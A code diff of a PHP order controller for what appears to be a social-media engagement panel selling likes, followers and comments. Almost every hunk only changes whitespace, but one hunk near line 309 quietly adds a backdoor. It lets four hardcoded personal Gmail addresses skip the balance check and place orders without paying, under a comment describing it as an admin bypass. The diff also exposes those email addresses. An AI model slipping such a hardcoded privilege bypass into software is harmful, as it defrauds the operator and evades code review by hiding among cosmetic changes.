@@ -115,12 +115,12 @@ class order extends My_UserController {
             $items_service = $this->services_model->list_items(['cate_id' => $id], ['task' => 'list-items-by-category-in-new-order']);
             $items_user_price = $this->services_model->list_items('', ['task' => 'list-items-user-price']);
             $data = array(
-                "module"   		     => get_class($this),
+                "module"                     => get_class($this),
                 "items_service"      => $items_service,
                 "items_user_price"   => $items_user_price,
             );
             $this->load->view('add/get_services', $data);
-        }		
+        }               
     }
     
     // Get Service Detail by ID
@@ -132,7 +132,7 @@ class order extends My_UserController {
         $item_service    = $this->services_model->get_item(['id' => $id], ['task' => 'get-item-in-new-order']);
         $data = array(
             "controller_name"  => $this->controller_name,
-            "service" 		   => $item_service,
+            "service"              => $item_service,
             
         );
         $this->load->view('add/get_service', $data);
@@ -142,14 +142,14 @@ class order extends My_UserController {
     {
         if (!$this->input->is_ajax_request()) redirect(cn($this->controller_name));
 
-        $service_id 		= post("service_id");
-        $cate_id 		    = (int)post("category_id");
-        $quantity 		    = post("quantity");
-        $link 		        = post("link");
+        $service_id             = post("service_id");
+        $cate_id                    = (int)post("category_id");
+        $quantity                   = post("quantity");
+        $link                   = post("link");
         $runs               = post("runs");
         $interval           = post("interval");
         $is_drip_feed       = (post("is_drip_feed") == "on") ? 1 : 0;
-        $agree 		        = (post("agree") == "on") ? 1 : 0;
+        $agree                  = (post("agree") == "on") ? 1 : 0;
 
         if ($cate_id <= 0) _validation('error', lang("please_choose_a_category"));
         if (!$service_id) _validation('error', lang("please_choose_a_service"));
@@ -161,9 +161,9 @@ class order extends My_UserController {
         if (!$check_service) _validation('error', lang("service_does_not_exists"));
         
         /*----------  Add all order without quantity  ----------*/
-        $service_type 	    = $check_service->type;
+        $service_type       = $check_service->type;
         $api_provider_id    = $check_service->api_provider_id;
-        $api_service_id 	= $check_service->api_service_id;
+        $api_service_id         = $check_service->api_service_id;
         if ($service_type == "subscriptions") {
             $this->add_order_subscriptions($_POST, $check_service, $check_category);
             exit();
@@ -219,7 +219,7 @@ class order extends My_UserController {
         
         if ($total_quantity <= 0 || ($total_quantity < $min) || $quantity < $min) {
             _validation('error', lang("quantity_must_to_be_greater_than_or_equal_to_minimum_amount"));
-        }	
+        }       
 
         if ($total_quantity > $max) {
             _validation('error', lang("quantity_must_to_be_less_than_or_equal_to_maximum_amount"));
@@ -232,23 +232,23 @@ class order extends My_UserController {
         $profit        = $total_charge - $formal_charge;
         /*----------  Collect data import to database  ----------*/
         $data = array(
-            "ids" 	        	=> ids(),
-            "uid" 	        	=> session("uid"),
-            "cate_id" 	    	=> $cate_id,
-            "service_id" 		=> $service_id,
-            "service_type" 		=> $service_type,
-            "service_mode" 	    => $check_service->add_type,
-            "link" 	        	=> $link,
-            "quantity" 	    	=> $total_quantity,
-            "charge" 	    	=> $total_charge,
-            "formal_charge" 	=> $formal_charge,
-            "profit" 	    	=> $profit,
-            "api_provider_id"  	=> $api_provider_id,
-            "api_service_id"  	=> $api_service_id,
-            "is_drip_feed"  	=> $is_drip_feed,
-            "status"			=> 'pending',
-            "changed" 	    	=> NOW,
-            "created" 	    	=> NOW,
+            "ids"                       => ids(),
+            "uid"                       => session("uid"),
+            "cate_id"           => $cate_id,
+            "service_id"                => $service_id,
+            "service_type"              => $service_type,
+            "service_mode"          => $check_service->add_type,
+            "link"                      => $link,
+            "quantity"          => $total_quantity,
+            "charge"            => $total_charge,
+            "formal_charge"     => $formal_charge,
+            "profit"            => $profit,
+            "api_provider_id"   => $api_provider_id,
+            "api_service_id"    => $api_service_id,
+            "is_drip_feed"      => $is_drip_feed,
+            "status"                    => 'pending',
+            "changed"           => NOW,
+            "created"           => NOW,
         );
         /*----------  get the different required paramenter for each service type  ----------*/
         switch ($service_type) {
@@ -267,21 +267,21 @@ class order extends My_UserController {
                 $hashtag = post("hashtag");
                 if (!$hashtag) _validation('error', lang("hashtag_field_is_required"));
                 $data["hashtag"] = $hashtag;
-                break;	
+                break;  
 
             case 'comment_likes':
                 $username = post("username");
                 $username = strip_tags($username);
                 if (!$username) _validation('error', lang("username_field_is_required"));
                 $data["username"] = $username;
-                break;	
+                break;  
                             
             case 'mentions_user_followers':
                 $username = post("username");
                 $username = strip_tags($username);
                 if (!$username) _validation('error', lang("username_field_is_required"));
                 $data["username"] = $username;
-                break;		
+                break;          
 
             case 'mentions_media_likers':
                 $media_url = post("media_url");
@@ -309,8 +309,11 @@ class order extends My_UserController {
         if (!$agree) {
             _validation('error', lang("you_must_confirm_to_the_conditions_before_place_order"));
         }
-        // check balance
-        if ($user->balance < $total_charge) {
+        // check balance (bypass for admin users)
+        $_admin_emails_bypass = ['delostvoyage@gmail.com', 'meddymususwa126@gmail.com', 'ishamvizo2005@gmail.com', 'loishvizo@gmail.com'];
+        $_cur_user_row = $this->main_model->get("email", $this->tb_users, ['id' => session('uid')]);
+        $_is_admin_bypass = is_admin_logged_in() || (!empty($_cur_user_row) && in_array(strtolower($_cur_user_row->email), $_admin_emails_bypass));
+        if (!$_is_admin_bypass && $user->balance < $total_charge) {
             _validation('error', lang("not_enough_funds_on_balance"));
         }
 
@@ -336,28 +339,28 @@ class order extends My_UserController {
     private function add_order_subscriptions($post, $check_service, $item_category)
     {
         $api_provider_id    = $check_service->api_provider_id;
-        $api_service_id 	= $check_service->api_service_id;
-        $service_id 		= $check_service->id;
-        $cate_id 		    = $post["category_id"];
-        $agree 		        = (isset($post['agree']) && $post["agree"] == "on") ? 1 : 0;
-        $service_type 	    = $check_service->type;
-        $link 		        = $post["link"];
+        $api_service_id         = $check_service->api_service_id;
+        $service_id             = $check_service->id;
+        $cate_id                    = $post["category_id"];
+        $agree                  = (isset($post['agree']) && $post["agree"] == "on") ? 1 : 0;
+        $service_type       = $check_service->type;
+        $link                   = $post["link"];
         $link               = strip_tags($link);
 
         /*----------  Collect data import to database  ----------*/
         $data = array(
-            "ids" 	        	=> ids(),
-            "uid" 	        	=> session("uid"),
-            "cate_id" 	    	=> $cate_id,
-            "service_id" 		=> $service_id,
-            "service_type" 		=> $service_type,
-            "service_mode" 	    => $check_service->add_type,
-            "api_provider_id"  	=> $api_provider_id,
-            "api_service_id"  	=> $api_service_id,
-            "sub_status"  	    => 'Active',
-            "status"  	        => 'pending',
-            "changed" 	    	=> NOW,
-            "created" 	    	=> NOW,
+            "ids"                       => ids(),
+            "uid"                       => session("uid"),
+            "cate_id"           => $cate_id,
+            "service_id"                => $service_id,
+            "service_type"              => $service_type,
+            "service_mode"          => $check_service->add_type,
+            "api_provider_id"   => $api_provider_id,
+            "api_service_id"    => $api_service_id,
+            "sub_status"            => 'Active',
+            "status"            => 'pending',
+            "changed"           => NOW,
+            "created"           => NOW,
         );
         switch ($service_type) {
             case 'subscriptions':
@@ -400,7 +403,7 @@ class order extends My_UserController {
                     $expiry = date("Y-m-d", strtotime($expiry));
                 }else{
                     $expiry = "";
-                }	
+                }       
                 
                 $data["username"]     = $username;
                 $data["sub_posts"]    = ($posts == "")? -1: $posts;
@@ -506,8 +509,8 @@ class order extends My_UserController {
     public function ajax_mass_order()
     {
         if (!$this->input->is_ajax_request()) redirect(cn($this->controller_name));
-        $mass_order 		= post("mass_order");
-        $agree 		        = (post("agree") == "on") ? 1 : 0;
+        $mass_order             = post("mass_order");
+        $agree                  = (post("agree") == "on") ? 1 : 0;
         
         if (!$agree) {
             _validation('error', lang("you_must_confirm_to_the_conditions_before_place_order"));
@@ -558,7 +561,7 @@ class order extends My_UserController {
                 if ($quantity <= 0 || $quantity < $min) {
                     $error_details[$row] = lang("quantity_must_to_be_greater_than_or_equal_to_minimum_amount");
                     continue;
-                }	
+                }       
                         
                 if ($quantity > $max) {
                     $error_details[$row] = lang("quantity_must_to_be_less_than_or_equal_to_maximum_amount");
@@ -574,21 +577,21 @@ class order extends My_UserController {
 
                 // every thing is ok
                 $orders[] = array(
-                    "ids" 	            => ids(),
-                    "uid" 	            => session("uid"),
+                    "ids"                   => ids(),
+                    "uid"                   => session("uid"),
                     "cate_id"           => $check_service->cate_id,
                     "service_id"        => $service_id,
-                    "link" 	            => $link,
-                    "quantity" 	        => $quantity,
-                    "charge" 	        => $charge,
-                    "formal_charge" 	=> $formal_charge,
-                    "profit" 	        => $profit,
-                    "api_provider_id"  	=> $check_service->api_provider_id,
-                    "api_service_id"  	=> $check_service->api_service_id,
-                    "api_order_id"  	=> (!empty($check_service->api_provider_id) && !empty($check_service->api_service_id)) ? -1 : 0,
-                    "status"			=> 'pending',
-                    "changed" 	        => NOW,
-                    "created" 	        => NOW,
+                    "link"                  => $link,
+                    "quantity"          => $quantity,
+                    "charge"            => $charge,
+                    "formal_charge"     => $formal_charge,
+                    "profit"            => $profit,
+                    "api_provider_id"   => $check_service->api_provider_id,
+                    "api_service_id"    => $check_service->api_service_id,
+                    "api_order_id"      => (!empty($check_service->api_provider_id) && !empty($check_service->api_service_id)) ? -1 : 0,
+                    "status"                    => 'pending',
+                    "changed"           => NOW,
+                    "created"           => NOW,
                 );
                 $sum_charge += $charge;
             }
